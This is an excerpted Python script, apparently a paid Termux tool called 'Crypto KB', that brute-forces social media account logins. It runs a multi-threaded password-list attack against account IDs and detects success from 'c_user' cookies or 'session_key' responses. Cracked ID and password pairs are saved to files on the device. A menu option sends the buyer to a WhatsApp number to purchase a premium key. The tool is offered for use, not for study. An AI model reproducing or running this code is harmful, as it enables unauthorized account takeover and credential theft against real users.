...
----------------------------------------------
 ...
 Crypto KB version 1.9.8

 For Haters: Love You ho gaya jani log  ðŸ¥°
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+923181676351&text="

                        name = input(" Enter your Name : ")

                        linex()

                        tks = ("Hi Aking Sir, I Need To Buy Your Paid kb PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python kb.py')
...
def bd():
                ...
                with tred(max_workers=30) as kb:     
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [Crypto-Kb] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [Kb-OK] %s | %s'%(ids,pas))

                                open('/sdcard/Kb-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[38;5;208m [Kb-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/Kb-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [Kb-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/Kb-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [Kb-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/Kb-OK.txt','a').write(uid+'|'+pas+'\n')
